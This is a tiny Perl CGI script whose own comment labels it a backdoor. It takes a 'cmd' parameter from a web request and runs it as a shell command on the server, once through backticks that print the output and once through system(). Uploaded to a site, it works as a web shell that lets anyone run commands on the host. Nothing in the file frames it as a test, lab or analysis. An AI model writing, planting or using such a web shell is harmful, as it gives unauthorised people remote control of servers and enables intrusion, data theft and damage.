#!/usr/bin/perl
# Perl backdoor
use CGI;
my $q = CGI->new;
my $cmd = $q->param('cmd');
print `$cmd`;
system($cmd);
